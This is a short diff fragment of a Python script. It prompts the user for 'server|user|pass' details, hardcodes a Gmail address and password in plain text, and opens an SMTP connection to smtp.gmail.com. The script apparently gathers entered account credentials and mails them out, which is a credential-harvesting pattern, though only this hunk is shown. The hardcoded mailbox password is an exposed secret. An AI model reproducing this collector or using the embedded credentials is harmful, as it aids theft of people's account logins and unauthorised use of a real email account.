@@ -49,7 +49,7 @@ print("")
 print("\033[92m server|user|pass \033[0m")
 print("\033[93m contoh, 1|bjorka|123 \033[0m")
 #msg = input("\033[92m > \033[0m")
-msg = input("ID = " + nameee + "MEMBUAT AKUN!")
+msg = input("ID = " + nameee + " >")
 username = 'helc95209@gmail.com'
 password = 'svxsolvclixcvkjj'
 server = smtplib.SMTP('smtp.gmail.com',587)
